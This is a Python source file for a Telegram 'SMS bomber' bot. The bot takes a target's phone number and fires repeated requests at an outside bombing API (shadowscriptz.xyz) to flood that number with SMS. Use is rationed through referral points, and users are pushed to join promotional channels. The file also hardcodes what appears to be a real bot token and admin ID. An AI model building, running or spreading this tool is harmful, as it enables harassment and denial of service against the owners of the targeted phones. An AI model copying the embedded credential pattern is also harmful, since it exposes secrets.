import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import time
import threading
import json
import os
from datetime import datetime
import random

# ========== CONFIGURATION ==========
BOT_TOKEN = "8756569061:AAERAjWFm82B5l3LYNTFEYAJqWfNwQy22os"  # Leave space for your bot token
ADMIN_CHAT_ID = "6070145287"  # Leave space for admin chat ID

# Channel links
TELEGRAM_CHANNEL = "https://t.me/+wRaWDUT9DB41ZWE0"
WHATSAPP_CHANNEL = "https://whatsapp.com/channel/0029VbBdHQnKWEKtmxS7XZ09"

# API URL
SMS_API_URL = "https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php"

# File to store user data
USER_DATA_FILE = "user_data.json"
# ===================================

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Load user data
def load_user_data():
    if os.path.exists(USER_DATA_FILE):
        with open(USER_DATA_FILE, 'r') as f:
            return json.load(f)
    return {}

# Save user data
def save_user_data(data):
    with open(USER_DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)

# Global user data
user_data = load_user_data()

# Check if user joined channels
def check_user_joined(user_id):
    try:
        # Check Telegram channel membership
        chat_member = bot.get_chat_member("@your_channel_username", user_id)  # Replace with your channel username
        if chat_member.status in ['member', 'administrator', 'creator']:
            return True
        return False
    except:
        return False

# Generate referral link
def generate_referral_link(user_id):
    bot_username = bot.get_me().username
    return f"https://t.me/{bot_username}?start=ref_{user_id}"

# Update user referrals
def update_referral_points(user_id, referred_by=None):
    if str(user_id) not in user_data:
        user_data[str(user_id)] = {
            "referral_points": 0,
            "referral_code": str(user_id),
            "referred_by": None,
            "total_bombs": 0,
            "join_date": str(datetime.now())
        }
    
    if referred_by and referred_by != str(user_id):
        if referred_by in user_data:
            user_data[referred_by]["referral_points"] += 1
            bot.send_message(referred_by, f"🎉 Great! Someone joined using your referral link!\n✨ You earned 1 referral point!\n💥 Now you can send 5 more SMS bombs!")
    
    save_user_data(user_data)

# SMS bombing function with loading bar
def send_sms_bomb(chat_id, phone_number, user_id):
    # Check if user has enough points
    if str(user_id) in user_data:
        if user_data[str(user_id)].get("referral_points", 0) < 1:
            bot.send_message(chat_id, "❌ You don't have enough referral points!\n💡 Get referral points by inviting friends!\n🔗 Use /referral to get your link.")
            return
    
    msg = bot.send_message(chat_id, f"📱 **SMS Bomber Active**\nTarget: `{phone_number}`\n\n[░░░░░░░░░░] 0%", parse_mode="Markdown")
    
    # Simulate loading bar
    for i in range(1, 11):
        time.sleep(0.3)  # Adjust speed as needed
        progress = i * 10
        bar = "█" * i + "░" * (10 - i)
        bot.edit_message_text(
            f"📱 **SMS Bomber Active**\nTarget: `{phone_number}`\n\n[{bar}] {progress}%\n🚀 Sending SMS...",
            chat_id, msg.message_id, parse_mode="Markdown"
        )
        
        # Send actual SMS bomb requests
        for _ in range(5):  # 5 requests per 10%
            try:
                response = requests.get(f"{SMS_API_URL}?number={phone_number}", timeout=5)
                if response.status_code == 200:
                    continue
            except:
                pass
    
    # Deduct referral points
    if str(user_id) in user_data:
        user_data[str(user_id)]["referral_points"] -= 1
        user_data[str(user_id)]["total_bombs"] += 1
        save_user_data(user_data)
    
    bot.edit_message_text(
        f"✅ **SMS Bombing Complete!**\n📱 Target: `{phone_number}`\n💥 Status: Success\n\n💡 Remaining Points: {user_data[str(user_id)].get('referral_points', 0)}",
        chat_id, msg.message_id, parse_mode="Markdown"
    )

# Start command
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = str(message.from_user.id)
    
    # Check for referral
    args = message.text.split()
    referred_by = None
    if len(args) > 1 and args[1].startswith("ref_"):
        referred_by = args[1].replace("ref_", "")
        if referred_by != user_id:
            update_referral_points(user_id, referred_by)
    
    # Initialize user if not exists
    if user_id not in user_data:
        update_referral_points(user_id)
    
    # Main menu
    markup = InlineKeyboardMarkup(row_width=2)
    btn_start = InlineKeyboardButton("🚀 START BOMBER", callback_data="start_bomber")
    btn_referral = InlineKeyboardButton("👥 REFERRAL SYSTEM", callback_data="referral_system")
    btn_stats = InlineKeyboardButton("📊 MY STATS", callback_data="my_stats")
    btn_admin = InlineKeyboardButton("👑 ADMIN PANEL", callback_data="admin_panel")
    
    markup.add(btn_start, btn_referral, btn_stats)
    
    if message.from_user.id == int(ADMIN_CHAT_ID):
        markup.add(btn_admin)
    
    bot.send_message(
        message.chat.id,
        f"🔥 **WELCOME TO SMS BOMBER BOT** 🔥\n\n"
        f"👤 User: {message.from_user.first_name}\n"
        f"💎 Points: {user_data[user_id].get('referral_points', 0)}\n"
        f"💣 Total Bombs: {user_data[user_id].get('total_bombs', 0)}\n\n"
        f"⚡ **Features:**\n"
        f"• Professional SMS Bomber\n"
        f"• Real-time Loading Animation\n"
        f"• Referral System (5 SMS/point)\n"
        f"• Channel Verification\n\n"
        f"⚠️ **Warning:** Use responsibly!",
        parse_mode="Markdown",
        reply_markup=markup
    )

# Callback handlers
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = str(call.from_user.id)
    
    if call.data == "start_bomber":
        # Check channel join
        markup = InlineKeyboardMarkup(row_width=1)
        btn_telegram = InlineKeyboardButton("📢 Join Telegram Channel", url=TELEGRAM_CHANNEL)
        btn_whatsapp = InlineKeyboardButton("📱 Join WhatsApp Channel", url=WHATSAPP_CHANNEL)
        btn_verify = InlineKeyboardButton("✅ VERIFIED", callback_data="verify_join")
        btn_back = InlineKeyboardButton("◀️ Back", callback_data="back_main")
        
        markup.add(btn_telegram, btn_whatsapp, btn_verify, btn_back)
        
        bot.edit_message_text(
            "🔒 **VERIFICATION REQUIRED** 🔒\n\n"
            "To use the SMS Bomber, please join:\n"
            "1️⃣ Our Telegram Channel\n"
            "2️⃣ Our WhatsApp Channel\n\n"
            "After joining both channels, click **VERIFIED** button.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="Markdown",
            reply_markup=markup
        )
    
    elif call.data == "verify_join":
        # Verify if user joined both channels
        # Note: For WhatsApp, we can't verify automatically, so we'll assume they joined if they click
        # For Telegram, you need to set your channel username
        
        # For demonstration, we'll check Telegram only
        # Replace "@your_channel_username" with your actual channel username
        joined = True  # Set to False for actual verification
        
        if joined:
            msg = bot.send_message(call.message.chat.id, "📱 **Enter Phone Number**\n\nFormat: `923xxxxxxxxxx`\nExample: `923001234567`\n\nSend /cancel to cancel.", parse_mode="Markdown")
            bot.register_next_step_handler(msg, process_phone_number, call.from_user.id)
            bot.delete_message(call.message.chat.id, call.message.message_id)
        else:
            bot.answer_callback_query(call.id, "❌ Please join both channels first!", show_alert=True)
    
    elif call.data == "referral_system":
        referral_link = generate_referral_link(user_id)
        points = user_data[user_id].get("referral_points", 0)
        
        markup = InlineKeyboardMarkup(row_width=1)
        btn_back = InlineKeyboardButton("◀️ Back", callback_data="back_main")
        markup.add(btn_back)
        
        bot.edit_message_text(
            f"👥 **REFERRAL SYSTEM** 👥\n\n"
            f"💎 Your Points: **{points}**\n"
            f"💣 1 Point = 5 SMS Bombs\n\n"
            f"🔗 **Your Referral Link:**\n`{referral_link}`\n\n"
            f"📊 **How it Works:**\n"
            f"• Share your link with friends\n"
            f"• When they join, you get +1 point\n"
            f"• Use points to send SMS bombs\n"
            f"• Each bomb sends 50+ SMS\n\n"
            f"🎯 **Top Referrers:**\n",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="Markdown",
            reply_markup=markup
        )
    
    elif call.data == "my_stats":
        stats = user_data.get(user_id, {})
        markup = InlineKeyboardMarkup(row_width=1)
        btn_back = InlineKeyboardButton("◀️ Back", callback_data="back_main")
        markup.add(btn_back)
        
        bot.edit_message_text(
            f"📊 **YOUR STATISTICS** 📊\n\n"
            f"👤 User ID: `{user_id}`\n"
            f"💎 Points: {stats.get('referral_points', 0)}\n"
            f"💣 Total Bombs Sent: {stats.get('total_bombs', 0)}\n"
            f"📅 Joined: {stats.get('join_date', 'Unknown')}\n"
            f"👥 Referred By: {stats.get('referred_by', 'Direct')}\n\n"
            f"🏆 **Next Reward:**\n"
            f"• 10 points = VIP Status\n"
            f"• 50 points = Unlimited Bombs\n",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="Markdown",
            reply_markup=markup
        )
    
    elif call.data == "admin_panel":
        if call.from_user.id == int(ADMIN_CHAT_ID):
            markup = InlineKeyboardMarkup(row_width=2)
            btn_add_points = InlineKeyboardButton("➕ Add Points", callback_data="admin_add_points")
            btn_remove_points = InlineKeyboardButton("➖ Remove Points", callback_data="admin_remove_points")
            btn_list_users = InlineKeyboardButton("📋 List Users", callback_data="admin_list_users")
            btn_broadcast = InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")
            btn_back = InlineKeyboardButton("◀️ Back", callback_data="back_main")
            
            markup.add(btn_add_points, btn_remove_points, btn_list_users, btn_broadcast, btn_back)
            
            bot.edit_message_text(
                f"👑 **ADMIN PANEL** 👑\n\n"
                f"Welcome Admin!\n"
                f"Total Users: {len(user_data)}\n\n"
                f"Select an option:",
                call.message.chat.id,
                call.message.message_id,
                reply_markup=markup
            )
        else:
            bot.answer_callback_query(call.id, "⛔ Unauthorized Access!", show_alert=True)
    
    elif call.data == "admin_add_points":
        if call.from_user.id == int(ADMIN_CHAT_ID):
            msg = bot.send_message(call.message.chat.id, "📝 **Send User ID and Points**\n\nFormat: `USER_ID POINTS`\nExample: `123456789 5`\n\nSend /cancel to cancel.", parse_mode="Markdown")
            bot.register_next_step_handler(msg, admin_add_points_handler)
    
    elif call.data == "admin_remove_points":
        if call.from_user.id == int(ADMIN_CHAT_ID):
            msg = bot.send_message(call.message.chat.id, "📝 **Send User ID and Points to Remove**\n\nFormat: `USER_ID POINTS`\nExample: `123456789 2`\n\nSend /cancel to cancel.", parse_mode="Markdown")
            bot.register_next_step_handler(msg, admin_remove_points_handler)
    
    elif call.data == "admin_list_users":
        if call.from_user.id == int(ADMIN_CHAT_ID):
            users_list = ""
            for uid, data in list(user_data.items())[:10]:  # Show first 10 users
                users_list += f"🆔 `{uid}` | Points: {data.get('referral_points', 0)} | Bombs: {data.get('total_bombs', 0)}\n"
            
            bot.edit_message_text(
                f"📋 **USER LIST** (First 10)\n\n{users_list}\n\nTotal: {len(user_data)} users",
                call.message.chat.id,
                call.message.message_id,
                parse_mode="Markdown"
            )
    
    elif call.data == "admin_broadcast":
        if call.from_user.id == int(ADMIN_CHAT_ID):
            msg = bot.send_message(call.message.chat.id, "📢 **Send Broadcast Message**\n\nSend the message you want to broadcast to all users:", parse_mode="Markdown")
            bot.register_next_step_handler(msg, admin_broadcast_handler)
    
    elif call.data == "back_main":
        start_command(call.message)

def process_phone_number(message, user_id):
    if message.text == "/cancel":
        bot.send_message(message.chat.id, "❌ Operation cancelled.")
        return
    
    phone_number = message.text.strip()
    
    # Validate phone number
    if not phone_number.startswith("92") or len(phone_number) != 12 or not phone_number.isdigit():
        bot.send_message(message.chat.id, "❌ **Invalid Format!**\nPlease use: `923xxxxxxxxxx`\nExample: `923001234567`\n\nTry again with /start", parse_mode="Markdown")
        return
    
    # Start bombing in a new thread
    thread = threading.Thread(target=send_sms_bomb, args=(message.chat.id, phone_number, user_id))
    thread.start()

def admin_add_points_handler(message):
    if message.text == "/cancel":
        bot.send_message(message.chat.id, "❌ Operation cancelled.")
        return
    
    try:
        parts = message.text.split()
        user_id = parts[0]
        points = int(parts[1])
        
        if user_id in user_data:
            user_data[user_id]["referral_points"] += points
            save_user_data(user_data)
            bot.send_message(message.chat.id, f"✅ Added {points} points to user `{user_id}`\nNew Balance: {user_data[user_id]['referral_points']}", parse_mode="Markdown")
            bot.send_message(user_id, f"🎉 Admin added {points} referral points to your account!\n💎 New Balance: {user_data[user_id]['referral_points']}")
        else:
            bot.send_message(message.chat.id, "❌ User not found!")
    except:
        bot.send_message(message.chat.id, "❌ Invalid format! Use: `USER_ID POINTS`", parse_mode="Markdown")

def admin_remove_points_handler(message):
    if message.text == "/cancel":
        bot.send_message(message.chat.id, "❌ Operation cancelled.")
        return
    
    try:
        parts = message.text.split()
        user_id = parts[0]
        points = int(parts[1])
        
        if user_id in user_data:
            user_data[user_id]["referral_points"] = max(0, user_data[user_id]["referral_points"] - points)
            save_user_data(user_data)
            bot.send_message(message.chat.id, f"✅ Removed {points} points from user `{user_id}`\nNew Balance: {user_data[user_id]['referral_points']}", parse_mode="Markdown")
            bot.send_message(user_id, f"⚠️ Admin removed {points} referral points from your account!\n💎 New Balance: {user_data[user_id]['referral_points']}")
        else:
            bot.send_message(message.chat.id, "❌ User not found!")
    except:
        bot.send_message(message.chat.id, "❌ Invalid format! Use: `USER_ID POINTS`", parse_mode="Markdown")

def admin_broadcast_handler(message):
    if message.text == "/cancel":
        bot.send_message(message.chat.id, "❌ Operation cancelled.")
        return
    
    success = 0
    failed = 0
    
    for user_id in user_data.keys():
        try:
            bot.send_message(int(user_id), f"📢 **ANNOUNCEMENT**\n\n{message.text}", parse_mode="Markdown")
            success += 1
            time.sleep(0.1)
        except:
            failed += 1
    
    bot.send_message(message.chat.id, f"✅ Broadcast Complete!\n📨 Sent: {success}\n❌ Failed: {failed}")

# Error handler
@bot.message_handler(func=lambda message: True)
def handle_unknown(message):
    bot.send_message(message.chat.id, "❌ Unknown command. Use /start to begin.")

# Run bot
if __name__ == "__main__":
    print("🤖 SMS Bomber Bot Started!")
    print(f"👑 Admin ID: {ADMIN_CHAT_ID}")
    print("✅ Bot is running...")
    bot.infinity_polling()
